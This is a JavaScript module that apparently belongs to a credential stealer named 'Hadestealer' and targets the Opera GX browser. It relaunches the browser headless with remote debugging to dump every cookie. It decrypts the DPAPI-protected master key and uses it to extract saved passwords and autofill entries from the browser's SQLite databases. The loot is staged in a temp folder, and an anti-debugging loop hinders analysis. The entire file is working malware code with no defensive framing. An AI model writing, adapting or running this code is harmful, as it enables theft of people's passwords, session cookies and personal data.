'use strict';

const fs = require("fs");
const path = require("path");
const os = require("os");
const child_process = require("child_process");
const axios = require("axios");
const WebSocket = require("ws");
const sqlite3 = require("sqlite3");
const constants = require("../config/constants");
const cryptoProvider = require("../core/crypto");
const helpers = require("../core/helpers");
const processUtils = require("../utils/process");
const dataVault = require("datavault-win");

function browserExistsOpera(tag) {
    return fs.existsSync(constants.configsOpera[tag].bin);
}

async function startBrowserOpera(tag) {
    const config = constants.configsOpera[tag];
    if (!config) return;

    const randomPort = Math.floor(Math.random() * (65535 - 1024) + 1024);
    const operaPath = process.env.LOCALAPPDATA + "\\Programs\\Opera GX\\opera.exe";
    
    const args = [
        "--remote-debugging-port=" + randomPort,
        "--user-data-dir=" + process.env.APPDATA + "\\Opera Software\\Opera GX Stable",
        "--no-sandbox",
        "--headless" 
    ];

    const browserProcess = child_process.spawn(operaPath, args, { shell: false });
    await helpers.sleep(5000); 

    return { browserProcess, randomPort };
}

async function getDebugWsUrlOpera(port) {
    const debugUrl = `http://127.0.0.1:${port}/json`;
    let retries = 5;

    while (retries > 0) {
        try {
            const response = await axios.get(debugUrl);
            const data = response.data;
            if (data && data.length > 0) {
                return data[0]?.webSocketDebuggerUrl || null;
            }
        } catch (err) {
            await helpers.sleep(2000);
            retries--;
        }
    }
    return null;
}

async function saveCookiesToFileOpera(cookies) {
    const savePath = path.join(os.tmpdir(), "Hadestealer", "All", "Opera GX");
    if (!fs.existsSync(savePath)) {
        fs.mkdirSync(savePath, { recursive: true });
    }

    const filePath = path.join(savePath, "OperaGX-Cookies.txt");
    const formattedCookies = cookies.map(c => 
        `${c.domain}\tTRUE\t${c.path || "/"}\tFALSE\t${c.expires || "2597573456"}\t${c.name}\t${c.value}`
    ).join("\n");

    fs.writeFileSync(filePath, formattedCookies);
    return filePath;
}

async function getCookiesOpera(wsUrl) {
    return new Promise((resolve, reject) => {
        const ws = new WebSocket(wsUrl);
        ws.on("open", () => {
            ws.send(JSON.stringify({ method: "Network.getAllCookies", id: 1 }));
        });

        ws.on("message", (data) => {
            const res = JSON.parse(data.toString());
            if (res.id === 1 && res.result) {
                resolve(res.result.cookies);
                ws.close();
            }
        });

        ws.on("error", (err) => reject(err));
    });
}

async function processBrowserOpera(tag) {
    if (!browserExistsOpera(tag)) return;

    const browserData = await startBrowserOpera(tag);
    if (!browserData) return;

    const { browserProcess, randomPort } = browserData;
    const wsUrl = await getDebugWsUrlOpera(randomPort);

    if (!wsUrl) {
        browserProcess.kill();
        return;
    }

    try {
        const cookies = await getCookiesOpera(wsUrl);
        if (cookies && cookies.length > 0) {
            await saveCookiesToFileOpera(cookies);
        }
    } catch (e) {
    } finally {
        browserProcess.kill(); 
    }
}

async function startOpera() {
    const targets = ["operagx"];
    for (const target of targets) {
        await processBrowserOpera(target);
    }
}

async function opera() {
    processUtils.killOpera(); 
    await helpers.sleep(2000);
    await startOpera();
    await helpers.sleep(1000);
    processUtils.killOpera();
}

async function queryDatabase(dbPath, table, columns) {
    return new Promise(resolve => {
        if (!fs.existsSync(dbPath)) return resolve([]);

        const tempDb = path.join(os.tmpdir(), "tmp_" + Math.random().toString(36).slice(2) + ".db");
        try {
            fs.copyFileSync(dbPath, tempDb); 
        } catch (e) {
            return resolve([]);
        }

        const db = new sqlite3.Database(tempDb);
        const results = [];
        const query = `SELECT ${columns.join(",")} FROM ${table}`;

        db.each(query, (err, row) => {
            if (!err) results.push(row);
        }, () => {
            db.close();
            try { fs.unlinkSync(tempDb); } catch {}
            resolve(results);
        });
    });
}

async function Operapass() {
    try {
        const operaDir = constants.operaGXPath;
        if (!fs.existsSync(operaDir)) return;

        const localStatePath = path.join(operaDir, "Local State");
        const localState = JSON.parse(fs.readFileSync(localStatePath, "utf8"));
        
        const encryptedKey = Buffer.from(localState.os_crypt.encrypted_key, "base64").slice(5);
        let masterKey = dataVault.Dpapi.unprotectData(encryptedKey, null, "CurrentUser");

        const profiles = fs.readdirSync(operaDir, { withFileTypes: true })
            .filter(dir => dir.isDirectory() && (dir.name === "Default" || dir.name.startsWith("Profile")))
            .map(dir => path.join(operaDir, dir.name));

        const allPasswords = [];
        const allAutofills = [];

        for (const profilePath of profiles) {
            const loginDataPath = path.join(profilePath, "Login Data");
            const webDataPath = path.join(profilePath, "Web Data");

            const passwords = await queryDatabase(loginDataPath, "logins", ["origin_url", "username_value", "password_value"]);
            for (const entry of passwords) {
                const decrypted = cryptoProvider.decryptAESGCM(entry.password_value, masterKey);
                if (decrypted) {
                    allPasswords.push(`${entry.origin_url} | ${entry.username_value} | ${decrypted}`);
                }
            }

            const autofills = await queryDatabase(webDataPath, "autofill_profiles", ["name_value", "value"]);
            autofills.forEach(item => {
                if (item.name_value && item.value) {
                    allAutofills.push(`${item.name_value} | ${item.value}`);
                }
            });
        }

        const saveDir = path.join(os.tmpdir(), "Hadestealer", "All", "Opera GX");
        if (!fs.existsSync(saveDir)) fs.mkdirSync(saveDir, { recursive: true });

        if (allPasswords.length) fs.writeFileSync(path.join(saveDir, "passwords.txt"), allPasswords.join("\n"), "utf8");
        if (allAutofills.length) fs.writeFileSync(path.join(saveDir, "autofills.txt"), allAutofills.join("\n"), "utf8");

    } catch (err) {}
}

(function antiAnalysis() {
    const protect = function() {
        const check = function() {
            const pattern = new RegExp("function *\\( *\\)");
            const action = function() {
                (function() { return !![]; }).constructor("debugger").call("action");
            };
            if (!pattern.test(action.toString())) {
                action();
            }
        };
        setInterval(check, 4000);
    };
    try { protect(); } catch(e) {}
})();
